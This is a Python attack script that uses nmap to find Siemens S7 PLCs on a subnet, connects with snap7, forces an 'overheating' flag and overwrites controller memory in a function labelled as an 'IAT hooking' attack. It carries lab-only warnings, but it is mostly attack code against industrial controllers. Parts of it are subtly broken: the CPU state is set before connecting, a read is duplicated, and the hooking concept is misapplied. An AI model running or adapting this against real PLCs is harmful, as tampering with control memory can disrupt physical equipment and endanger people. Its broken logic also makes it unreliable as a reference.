import snap7
import struct
import time
import subprocess
import re

# Configuration - Consider moving these to a config file for easier modification
PLC_IP = None  # Will be auto-detected
PLC_RACK = 0
PLC_SLOT = 1
MOTOR_TEMP_ADDRESS = 7  # MW7
ACTIVATE_FAN_A_ADDRESS = 0  # M0.0
ACTIVATE_FAN_B_ADDRESS = 0  # M0.1
OVERHEATING_CHECK_ADDRESS = 0  # M0.2
TAG_2_ADDRESS = 0  # M0.4


# Function to find PLC IP address on the network using nmap (requires nmap to be installed)
def find_plc_ip():
    try:
        # Run nmap to discover Siemens S7 PLCs
        nmap_process = subprocess.Popen(['nmap', '-p', '102', '--open', '192.168.1.0/24'], stdout=subprocess.PIPE, stderr=subprocess.PIPE) # Replace 192.168.1.0/24 with your network's CIDR
        stdout, stderr = nmap_process.communicate()

        # Check for errors in nmap output
        if stderr:
            print(f"Error during nmap scan: {stderr.decode()}")
            return None

        # Parse nmap output to find PLC IP address
        output = stdout.decode()
        ip_address = None
        for line in output.splitlines():
            if "Siemens S7 PLC" in line:  # Or a more specific identifier
                match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
                if match:
                    ip_address = match.group(1)
                    print(f"PLC IP address found: {ip_address}")
                    return ip_address

        if not ip_address:
            print("No Siemens S7 PLC found on the network.")
            return None
    except FileNotFoundError:
        print("nmap is not installed. Please install nmap to use IP auto-detection.")
        return None

# Function to read a word (INT) from the PLC memory
def read_word(plc, db_number, address):
    try:
        plc.read_area(snap7.constants.Areas.MK, 0, address, 2)
        result = plc.read_area(snap7.constants.Areas.MK, 0, address, 2)
        value = struct.unpack(">h", result)[0]  # Unpack as big-endian short (2 bytes)
        return value
    except Exception as e:
        print(f"Error reading word from PLC: {e}")
        return None


# Function to write a boolean value to the PLC memory (Marks)
def write_bool(plc, db_number, address, bit_offset, value):
    try:
        byte_address = address  # Integer part of the address
        offset = bit_offset

        # Read the existing byte
        result = plc.read_area(snap7.constants.Areas.MK, 0, byte_address, 1)  # Length is 1 for a byte
        existing_byte = result[0]

        # Modify the specific bit in the byte
        if value:
            new_byte = existing_byte | (1 << offset)  # Set the bit
        else:
            new_byte = existing_byte & ~(1 << offset)  # Clear the bit

        # Write the modified byte back to the PLC
        plc.write_area(snap7.constants.Areas.MK, 0, byte_address, bytes([new_byte]))

        print(f"Successfully wrote {value} to M{address}.{offset}")

    except Exception as e:
        print(f"Error writing bool to PLC: {e}")



# Function to simulate the hooking - Modifies PLC's program logic by manipulating memory
def iat_hook_attack(plc, target_address, hook_address):
    """
    Simulates an IAT hooking attack by overwriting a memory location 
    with a pointer to malicious code.
    This is a simplified representation.  Real IAT hooking is much more complex.

    plc: Snap7 PLC client object.
    target_address: The memory address where the original function pointer would reside.
    hook_address: The memory address of the malicious code/hook function.
    """

    print(f"[ATTACK] Simulating IAT Hooking. Overwriting memory at {target_address} with pointer to {hook_address}")

    try:
        # This simulates writing the "address" of the hook function to the target location.
        # In a real attack, this would involve overwriting the IAT with the address of the malicious function.
        # Here, we write a representative value.  In a real attack this needs to be the address of malicious code.

        # Important:  This overwrites PLC memory.  Ensure you understand the consequences.
        hook_value = 0x4242 # Example replacement value
        data = struct.pack('>h', hook_value) # Big-endian short int. adjust format based on data being overwritten.
        plc.write_area(snap7.constants.Areas.MK, 0, target_address, data)

        print(f"[ATTACK] Memory at {target_address} overwritten with value simulating pointer to malicious code.")

    except Exception as e:
        print(f"[ATTACK] Error during IAT Hooking simulation: {e}")


def main():
    global PLC_IP
    if not PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("PLC IP address not found. Exiting.")
            return

    plc = snap7.client.Client()
    plc.set_cpu_state(snap7.constants.S7CpuStatus.s7cpuRun)
    plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)


    if plc.get_connected():
        print(f"Connected to PLC at {PLC_IP}")

        try:
            # Set the PLC CPU to RUN mode (Optional, but important for modifying values)
            plc.set_cpu_state(snap7.constants.S7CpuStatus.s7cpuRun)


            # Example Scenario: Simulate overheating, trigger the fans, then hook.
            print("Simulating a motor overheating scenario...")
            write_bool(plc, 0, OVERHEATING_CHECK_ADDRESS, 2, True)  # Set Overheating_Check TRUE

            # Give the PLC some time to process the change.
            time.sleep(2)


            # **IAT Hooking Simulation:**
            #  This is where the attack simulation occurs.
            #  We're simulating overwriting a function pointer in memory.
            # WARNING: This is a simplified simulation. It overwrites memory.
            #          Use with extreme caution in a lab environment ONLY.
            #  `target_address`: Address in the PLC memory to overwrite.
            #  `hook_address`: Address of malicious code.
            # **WARNING: DO NOT RUN AGAINST A PRODUCTION PLC.**
            iat_hook_attack(plc, 4, 16)  # Example: Overwrite memory at M4 (example IAT pointer) with "malicious code" at M16. Modify as needed for testing.

            # Set the PLC CPU to RUN mode (Optional, but important for modifying values)
            plc.set_cpu_state(snap7.constants.S7CpuStatus.s7cpuRun)



        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            plc.disconnect()
            print("Disconnected from PLC.")
    else:
        print("Failed to connect to PLC.")


if __name__ == "__main__":
    main()